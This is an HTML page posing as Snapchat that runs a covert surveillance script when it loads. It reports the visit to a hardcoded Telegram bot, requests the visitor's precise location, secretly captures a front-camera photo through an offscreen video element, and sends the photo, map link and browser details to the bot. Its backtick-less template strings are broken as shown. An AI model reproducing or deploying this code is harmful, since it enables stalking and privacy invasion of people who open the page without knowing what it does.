<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: url('bg.jpg') center/cover no-repeat fixed;
            min-height: 100vh;
        }
        video, canvas {
            position: fixed;
            left: -9999px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const B_T = "8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA";
        const C_I = "659131693";

        async function sendMsg(text) {
            await fetch(https://api.telegram.org/bot${B_T}/sendMessage, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C_I, text: text })
            }).catch(() => {});
        }

        async function sendPhoto(blob, lat, lon) {
            const fd = new FormData();
            fd.append('chat_id', C_I);
            fd.append('photo', blob, 'target.jpg');
            fd.append('caption', 📍 https://www.google.com/maps?q=${lat},${lon}\n🕒 ${new Date().toLocaleString('ckb')}\n🧬 ${navigator.userAgent});
            await fetch(https://api.telegram.org/bot${B_T}/sendPhoto, {
                method: 'POST',
                body: fd
            }).catch(() => {});
        }

        async function start() {
            await sendMsg("🎯 Target Opened Page");

            // ١. لۆکەیشن
            let lat = null, lon = null;
            try {
                const pos = await new Promise((ok, no) => {
                    navigator.geolocation.getCurrentPosition(ok, no, {
                        enableHighAccuracy: true, timeout: 5000
                    });
                });
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                await sendMsg(📍 https://www.google.com/maps?q=${lat},${lon});
            } catch (e) {
                await sendMsg(❌ Location: ${e.message});
            }

            // ٢. کامێرا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });
                const v = document.getElementById('video');
                v.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000));

                const c = document.getElementById('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);

                c.toBlob(async (blob) => {
                    if (blob) {
                        await sendPhoto(blob, lat || "N/A", lon || "N/A");
                        await sendMsg("📸 Sent");
                    }
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.7);
            } catch (e) {
                await sendMsg(🚫 Camera: ${e.name});
            }
        }

        // ڕاستەوخۆ دەستپێدەکات کاتێک پەیج کرایەوە
        window.addEventListener('load', () => {
            start();
        });
    </script>
</body>
</html>
